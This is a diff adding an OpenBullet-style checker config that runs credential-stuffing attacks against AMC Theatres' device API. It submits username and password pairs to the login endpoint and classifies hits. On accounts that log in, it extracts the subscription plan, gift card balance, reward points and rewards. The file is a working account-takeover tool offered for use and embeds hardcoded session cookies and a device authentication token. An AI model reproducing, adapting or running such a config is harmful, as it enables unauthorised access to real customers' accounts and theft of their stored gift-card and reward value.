@@ -1,0 +1,116 @@
+[SETTINGS]
+{
+  "Name": "AMCCC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-01T22:17:46.4614723-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://deviceapi.amctheatres.com/api/token-v2" 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&client_id=A9EEBB05-2E8F-4129-A1A3-9D2DE8BAFD8C" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "X-AMC-Session-Id: 2b7eb713-f250-4f2a-8c5e-281d41ecac75" 
+  HEADER "X-AMC-Transaction-Id: fca04555-f63f-46fa-ab25-ecf2e92a0bea" 
+  HEADER "X-AMC-Request-Id: ba864100-7073-4f0a-8614-5beee342ff34" 
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Cookie: f5avrbbbbbbbbbbbbbbbb=IJEIJBIGOEKOPEEFOHIIEDIKMKFAKLJKDALENINDPJDJOMEIDCEDLHODJBJLAOOCNLKDAMJPCPBOBCJFJEIAOJDKGMBKJIDCCAPPINCHGGAECFNCHOKCFJGPLPLMOJBO; TS01aa5625=01a483b9716445068bd167c6d259e0e7ad0d5ce940d8a207fa4f3c0526c606297362c74f9d69db74921bd4a83aeca1dc0a543d2a1a9e2917cc8f3ba0cce972cd74d75d0333" 
+  HEADER "Content-Length: 118" 
+  HEADER "Host: deviceapi.amctheatres.com" 
+  HEADER "Connection: Keep-Alive" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Call was canceled" 
+  KEYCHAIN Ban OR 
+    KEY "The server did not return a complete response for this request" 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "TOKEN" 
+
+REQUEST GET "https://deviceapi.amctheatres.com/api/account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR "{\"id\":" "," -> VAR "ID" 
+
+REQUEST GET "https://deviceapi.amctheatres.com/api/account/subscription" 
+  
+  HEADER "User-Agent: mobile-app" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "api-version: 1" 
+  HEADER "X-AMC-Session-Id: e93be5d3-82d0-461f-a0f4-3d43b79c763e" 
+  HEADER "X-AMC-Transaction-Id: 0570adc5-bc59-4922-a86a-d3f6d6aef24a" 
+  HEADER "X-AMC-Request-Id: 1a39d174-ca4c-4a61-b641-3d7ff40f3aff" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Cookie: " 
+
+PARSE "<SOURCE>" LR "planName\":\"" "\"" CreateEmpty=FALSE -> CAP "PLAN" 
+
+REQUEST GET "https://deviceapi.amctheatres.com/v2/account/<ID>/wallet" 
+  
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "X-AMC-Device-Id: 9cb6d0fb39c51314" 
+  HEADER "X-AMC-Device-OS-Type: Android" 
+  HEADER "X-AMC-Device-Category: Tablet" 
+  HEADER "X-AMC-Device-OS-Version: 5.1.1" 
+  HEADER "X-AMC-Device-Authentication-Token: Z_i-UWR4yPtGoAjM2b7DMq_AvYj8dHrK4ad8_NVhj74upC8f6oPCPwlMwZEostDaxBFkWznxk7Gg6JTaeaAvH9akz8sp0zSiluqJSp8qxJNBh415-DI9HXDY8Qtxwj2yeulwLUQ6Mc-w23Kc5ZmWdpDlYWp5C_8ZaSI6FeooP9Y" 
+  HEADER "X-AMC-Request-Id: 00000000-0000-0000-0000-000000000000" 
+  HEADER "Accept-Encoding: identity" 
+  HEADER "Host: deviceapi.amctheatres.com" 
+  HEADER "Connection: Keep-Alive" 
+
+PARSE "<SOURCE>" LR "\"giftCardSummary\":" "}" -> VAR "1" 
+
+PARSE "<1>" LR "balance\":" "," CreateEmpty=FALSE -> CAP "GC BAL" 
+
+REQUEST GET "https://deviceapi.amctheatres.com/api/account/reward-summary" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR "pointBalance\":" "," CreateEmpty=FALSE -> CAP "POINTS" 
+
+PARSE "<SOURCE>" LR "description\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "REWARDS" 
+
